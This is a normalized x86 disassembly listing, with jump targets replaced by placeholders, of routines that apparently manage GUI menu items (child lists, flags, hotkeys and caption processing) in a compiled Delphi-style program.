call sub_45c2f4
test esi esi
jge r-xdata
cmp eax esi
jg r-xdata
xor esi esi
mov eax ebx
call sub_45c35c
cmp esi eax
je r-xdata
mov esi eax
dec esi
mov edi [ ebx + 0x64 ]
mov edx ebx
mov eax edi
call sub_45c68c
mov ecx ebx
mov edx esi
mov eax edi
call sub_45c480
sub_45c3bc
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_45c2f4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_45c304
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_45c414
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
cmp bl [ ebp + 0x3a ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov [ ebp + 0x3a ] bl
mov dl 0x1
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebp + 0x64 ] 0x0
je r-xdata
mov eax [ ebp + 0x64 ]
call sub_45c2f4
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp + 0x64 ]
call sub_45c304
mov [ eax + 0x3a ] 0x0
mov edx esi
mov eax [ ebp + 0x64 ]
call sub_45c304
cmp [ eax + 0x3a ] 0x0
je r-xdata
sub_45c480
push ebx
push esi
push edi
push ebp
mov esi ecx
mov edi edx
mov ebx eax
cmp [ esi + 0x64 ] 0x0
je r-xdata
cmp [ ebx + 0x5c ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_459930
mov ebp edi
dec ebp
test ebp ebp
jl r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov [ ebx + 0x5c ] eax
mov cl [ esi + 0x3f ]
mov edx edi
mov eax ebx
call sub_45a828
mov ecx esi
mov edx edi
mov eax [ ebx + 0x5c ]
call sub_41a64c
mov [ esi + 0x64 ] ebx
mov [ esi + 0x84 ] ebx
mov [ esi + 0x80 ] sub_45c6f8
cmp [ ebx + 0x34 ] 0x0
je r-xdata
mov eax [ ebx + 0x5c ]
cmp ebp [ eax + 0x8 ]
jge r-xdata
mov eax ebx
call sub_45c2f4
dec eax
sete dl
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_45a758
mov edx ebp
mov eax [ ebx + 0x5c ]
call sub_41a5d0
mov al [ eax + 0x3f ]
cmp al [ esi + 0x3f ]
jbe r-xdata
mov edx ebp
mov eax [ ebx + 0x5c ]
call sub_41a5d0
mov dl [ eax + 0x3f ]
mov eax esi
call sub_45c298
sub_45c534
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov eax [ rw-data ]
call sub_459930
cmp [ ebx + 0x5c ] 0x0
je r-xdata
mov eax ebx
call sub_45c2f4
test eax eax
sete dl
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_45a758
mov eax ebx
call sub_45c2f4
cmp esi eax
jl r-xdata
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_41a5d0
mov edi eax
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_41a4c0
xor eax eax
mov [ edi + 0x64 ] eax
xor eax eax
mov [ edi + 0x80 ] eax
mov [ edi + 0x84 ] eax
cmp [ ebx + 0x34 ] 0x0
je r-xdata
sub_45c5a8
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x39 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
cmp [ ebx + 0xa8 ] 0x0
jne r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x78 ]
test al al
jne r-xdata
mov dl [ ebx + 0x38 ]
xor dl 0x1
mov eax ebx
call sub_45c1cc
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_45c2dc
test eax eax
je r-xdata
cmp [ ebx + 0xa8 ] 0x0
je r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov eax ebx
call sub_45c2dc
mov eax [ eax + 0x40 ]
cmp eax [ ebx + 0x88 ]
je r-xdata
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
mov edx ebx
mov eax [ ebx + 0x44 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
jmp r-xdata
sub_45c670
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_45c2f4
mov edx eax
mov ecx esi
mov eax ebx
call sub_45c480
pop esi
pop ebx
retn
sub_45c68c
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_45c658
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov edx esi
mov eax ebx
call sub_45c534
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_459930
sub_45c6b4
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x64 ] 0x0
jne r-xdata
mov eax esi
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
pop esi
pop ebx
retn
push ebx
mov ecx eax
mov edx esi
mov eax [ esi + 0x84 ]
call [ esi + 0x80 ]
xor eax eax
jmp r-xdata
cmp [ esi + 0x82 ] 0x0
je r-xdata
sub_45c6f8
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
push 0x0
mov ecx esi
mov edx ebx
call sub_45c6f8
jmp r-xdata
mov eax ebx
call sub_45a758
cmp [ ebx + 0x6c ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov eax esi
call sub_45e3d0
sub_45c750
push ebx
mov ebx eax
cmp [ ebx + 0x4c ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ ebx + 0x4c ]
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov eax [ ebx + 0x4c ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_428db8
mov [ ebx + 0x4c ] eax
sub_45c778
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
jne r-xdata
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov eax [ ebx + 0x44 ]
call sub_403254
xor eax eax
mov [ ebx + 0x44 ] eax
jmp r-xdata
mov edx edi
mov eax [ ebx + 0x44 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebx + 0x44 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_45ca0c
test [ edi + 0x1c ] 0x1
setne cl
mov edx edi
mov eax ebx
mov si 0xffef
call sub_403450
mov edx ebx
mov eax edi
call sub_420094
mov eax ebx
mov si 0xffee
call sub_403450
mov ecx ebx
mov dl 0x1
call [ eax + 0x14 ]
mov [ ebx + 0x44 ] eax
pop edi
pop esi
pop ebx
retn
sub_45c7e8
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x4c ] 0x0
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_428db8
mov [ esi + 0x4c ] eax
sub_45c81c
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_45c2f4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_45c304
mov edx [ eax ]
call [ edx + 0x40 ]
inc esi
dec ebx
jne r-xdata
sub_45c85c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_45c68c
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
mov eax [ esi + 0x34 ]
mov edx ebx
call sub_45c670
jmp r-xdata
mov edx ebx
mov eax esi
call sub_45c670
sub_45c8c0
push ebx
mov ebx eax
cmp dl [ ebx + 0x3d ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x3d ] dl
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebx + 0x3d ] 0x0
je r-xdata
mov eax ebx
call sub_45c184
sub_45c8ec
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov eax edi
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov al [ edi + 0x95 ]
mov [ esi + 0xa8 ] al
cmp [ esi + 0xa8 ] 0x0
jne r-xdata
mov edx [ edi + 0x64 ]
mov eax esi
call sub_45c15c
cmp [ esi + 0x30 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x69 ]
mov eax esi
call sub_45c1cc
cmp [ esi + 0x38 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x6a ]
mov eax esi
call sub_45c220
cmp [ esi + 0x39 ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x74 ]
mov [ esi + 0x54 ] eax
cmp [ esi + 0x54 ] 0x0
jne r-xdata
test bl bl
je r-xdata
lea eax [ esi + 0x58 ]
mov edx [ edi + 0x7c ]
call sub_403ff8
cmp [ esi + 0x58 ] 0x0
jne r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
cmp [ esi + 0x3d ] 0x0
je r-xdata
mov edx [ edi + 0x80 ]
mov eax esi
call sub_45c34c
cmp [ esi + 0x40 ] 0xffffffff
jne r-xdata
mov dl [ edi + 0x6c ]
mov eax esi
call sub_45c298
cmp [ esi + 0x3f ] 0x0
jne r-xdata
mov dx [ edi + 0x84 ]
mov eax esi
call sub_45c328
cmp [ esi + 0x60 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x86 ]
mov eax esi
call sub_45c33c
cmp [ esi + 0x3e ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x40 ]
mov [ esi + 0x88 ] eax
mov eax [ edi + 0x44 ]
mov [ esi + 0x8c ] eax
cmp [ esi + 0x8a ] 0x0
jne r-xdata
test bl bl
je r-xdata
sub_45ca0c
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_45c2dc
cmp edi eax
jne r-xdata
pop edi
pop esi
retn
xor ecx ecx
mov edx edi
mov eax esi
mov si 0xffef
call sub_403450
sub_45ca30
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45ca50
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45ca70
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45ca90
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45cab0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45cad0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45caf0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45cb10
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45cb30
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45cb50
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_41acac
mov dl [ ebx + 0x39 ]
mov edi esi
mov eax edi
call sub_4569a0
mov edx [ ebx + 0x54 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebx + 0x58 ]
mov eax edi
call sub_456ad8
mov edx [ ebx + 0x40 ]
mov eax edi
call sub_456b38
mov edx [ ebx + 0x30 ]
mov eax edi
call sub_456838
mov dl [ ebx + 0x3e ]
mov eax edi
call sub_456bf8
push [ ebx + 0x8c ]
push [ ebx + 0x88 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_45cbc8
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_4202e0
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_45c2dc
cmp edi eax
jne r-xdata
cmp edi [ esi + 0x7c ]
jne r-xdata
xor edx edx
mov eax esi
call sub_45c778
jmp r-xdata
cmp edi [ esi + 0x68 ]
jne r-xdata
xor edx edx
mov eax esi
call sub_45cc1c
jmp r-xdata
xor edx edx
mov eax esi
call sub_45a6e0
sub_45cc1c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x7c ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x7c ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x78 ]
call sub_4580b4
mov eax ebx
call sub_45cc8c
pop esi
pop ebx
retn
mov edx [ ebx + 0x78 ]
call sub_4580f8
mov edx ebx
mov eax [ ebx + 0x7c ]
call sub_420094
sub_45cc64
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax sub_45cc64
mov ecx esi
mov edx [ esi + 0x68 ]
call sub_459db4
push 0x1
mov ecx esi
mov edx esi
mov eax esi
call sub_45c6f8
mov eax ebx
pop esi
pop ebx
retn
sub_45cca0
push ebp
mov ebp esp
push ebx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_40c94c
test eax eax
setne bl
test bl bl
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
add edx 0xfffffffc
mov ecx 0x1
xchg edx eax
call sub_404504
sub_45ccd0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffe8
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_40403c
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
pop ecx
mov edi [ eax ]
call [ edi + 0x3c ]
inc ebx
dec esi
jne r-xdata
sub_45cd54
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_45ce76
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax [ esi ]
call sub_404264
test eax eax
jle r-xdata
test bl bl
je r-xdata
mov edi 0x1
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
push eax
mov eax [ esi ]
call sub_404264
mov edx eax
sub edx 0x3
inc edx
mov eax [ esi ]
mov ecx 0x3
call sub_4044c4
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_4043b0
jne r-xdata
inc edi
dec eax
jne r-xdata
mov bl 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ce7d
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403fc8
retn
mov edx esi
mov ecx [ ebp - 0x8 ]
mov eax r-xdata
call sub_40454c
push [ esi ]
push r-xdata
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
mov eax esi
mov edx 0x5
call sub_404324
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov eax [ esi ]
call sub_404264
mov ecx eax
sub ecx 0x3
mov eax [ esi ]
mov edx 0x1
call sub_4044c4
push [ ebp - 0x10 ]
push r-xdata
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
push r-xdata
mov eax esi
mov edx 0x6
call sub_404324
jmp r-xdata
mov edx [ esi ]
mov dl [ edx + edi - 0x1 ]
mov ecx [ rw-data ]
and edx 0xff
bt [ ecx ] edx
jae r-xdata
sub_45ceb4
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov [ ebp - 0x44 ] ecx
mov [ ebp - 0x40 ] ecx
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x19 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_45d353
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1a ] 0x0
cmp [ ebp - 0x19 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_40403c
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_45d314
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov [ ebp - 0x20 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_45c2f4
dec eax
test eax eax
jl r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
lea eax [ ebp - 0x34 ]
mov edx [ ebp - 0x4 ]
call sub_40403c
mov eax [ ebp - 0x20 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x38 ] eax
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d35a
lea eax [ ebp - 0x48 ]
mov edx 0x4
call sub_403fc8
lea eax [ ebp - 0x34 ]
mov edx 0x3
call sub_403fc8
lea eax [ ebp - 0x18 ]
call sub_403fa4
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
mov eax ebx
call sub_45d508
test al al
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
inc eax
mov [ ebp - 0x38 ] eax
inc esi
dec [ ebp - 0x38 ]
jne r-xdata
mov edx esi
mov eax ebx
call sub_45c304
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_4043b0
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
setg [ ebp - 0x1a ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
push ebp
call sub_45ccd0
pop ecx
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebp - 0x10 ]
jle r-xdata
lea ecx [ ebp - 0x30 ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx 0x1
jmp r-xdata
mov edx esi
mov eax ebx
call sub_45c304
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_45c304
cmp [ eax + 0x30 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403254
mov eax [ ebp - 0x20 ]
call sub_403254
mov eax [ ebp - 0x14 ]
call sub_403254
mov eax [ ebp - 0xc ]
call sub_403254
retn
inc eax
mov [ ebp - 0x38 ] eax
xor esi esi
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
push ebp
call sub_45ccd0
pop ecx
mov eax [ ebp - 0x30 ]
call sub_404264
cmp ebx eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_45c304
mov eax [ eax + 0x30 ]
lea edx [ ebp - 0x3c ]
call sub_45ee54
mov eax [ ebp - 0x3c ]
lea edx [ ebp - 0x2c ]
call sub_4080b8
cmp [ ebp - 0x2c ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
add eax 0x30
mov edx [ ebp - 0x30 ]
call sub_403ff8
inc esi
dec [ ebp - 0x38 ]
jne r-xdata
mov edx [ ebp - 0x30 ]
mov eax r-xdata
call sub_40c94c
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x30 ]
mov al [ eax + ebx - 0x1 ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov edx [ rw-data ]
mov eax [ ebp - 0x2c ]
call sub_40c94c
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_45c304
push eax
mov edx esi
mov eax ebx
call sub_45c304
mov ecx [ eax + 0x30 ]
xor edx edx
mov eax [ ebp - 0x20 ]
mov edi [ eax ]
call [ edi + 0x64 ]
jmp r-xdata
lea ecx [ ebp - 0x30 ]
mov edx esi
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
dec [ ebp - 0x38 ]
jne r-xdata
inc edi
xor esi esi
lea eax [ ebp - 0x44 ]
push eax
mov ecx 0x1
mov edx ebx
mov eax [ ebp - 0x30 ]
call sub_4044c4
mov eax [ ebp - 0x44 ]
lea edx [ ebp - 0x2c ]
call sub_4080b8
push ebp
mov eax [ ebp - 0x2c ]
call sub_45cca0
pop ecx
test al al
je r-xdata
inc ebx
jmp r-xdata
push ebp
mov eax [ ebp - 0x2c ]
call sub_45cca0
pop ecx
test al al
jne r-xdata
mov edx [ ebp - 0x30 ]
mov eax r-xdata
call sub_40c94c
test eax eax
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x34 ]
call sub_40403c
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx eax
mov eax [ ebp - 0x20 ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x20 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ecx eax
dec ecx
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x20 ]
mov ebx [ eax ]
call [ ebx + 0x70 ]
inc esi
dec edi
jne r-xdata
inc ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_45c304
add eax 0x30
push eax
mov edx esi
mov eax ebx
call sub_45c304
mov eax [ eax + 0x30 ]
lea edx [ ebp - 0x40 ]
call sub_45edc0
mov edx [ ebp - 0x40 ]
pop eax
call sub_403ff8
mov edx esi
mov eax ebx
call sub_45c304
push eax
mov edx esi
mov eax ebx
call sub_45c304
mov ecx [ eax + 0x30 ]
xor edx edx
mov eax [ ebp - 0x20 ]
mov edi [ eax ]
call [ edi + 0x64 ]
lea eax [ ebp - 0x48 ]
push eax
mov eax [ ebp - 0x18 ]
call sub_404264
mov edx eax
mov ecx 0x1
mov eax [ ebp - 0x18 ]
call sub_4044c4
mov edx [ ebp - 0x48 ]
lea eax [ ebp - 0x30 ]
xor ecx ecx
call sub_45cd54
mov eax [ ebp - 0x18 ]
call sub_404264
mov edx eax
lea eax [ ebp - 0x18 ]
mov ecx 0x1
call sub_404504
lea edx [ ebp - 0x30 ]
mov ecx ebx
mov eax r-xdata
call sub_40454c
lea eax [ ebp - 0x30 ]
mov ecx ebx
mov edx [ ebp - 0x2c ]
call sub_45cd54
jmp r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx [ ebp - 0x30 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
jmp r-xdata
sub_45d3b0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov [ esp ] 0x0
test bl bl
jne r-xdata
xor eax eax
mov [ esp + 0x4 ] eax
xor ebp ebp
mov ebx [ esp + 0x4 ]
mov eax esi
call sub_45c2f4
mov edi eax
dec edi
sub edi ebx
jl r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov ebx [ esp + 0x4 ]
mov eax esi
call sub_45c2f4
mov edi eax
dec edi
sub edi ebx
jl r-xdata
inc edi
mov al [ esp ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_45d534
test al al
je r-xdata
mov eax esi
call sub_45c2f4
mov ebx eax
dec ebx
mov edi [ esp + 0x4 ]
sub edi ebx
jg r-xdata
inc edi
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_45c304
call sub_45d38c
test al al
je r-xdata
dec edi
mov edx ebx
mov eax esi
call sub_45c304
cmp [ eax + 0x3e ] 0x0
je r-xdata
test ebp ebp
je r-xdata
mov edx ebx
mov eax esi
call sub_45c304
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov [ esp + 0x4 ] ebx
jmp r-xdata
mov edx ebx
mov eax esi
call sub_45c304
mov [ eax + 0x3e ] 0x0
mov [ esp ] 0x1
jmp r-xdata
dec ebx
inc edi
jne r-xdata
mov edx ebx
mov eax esi
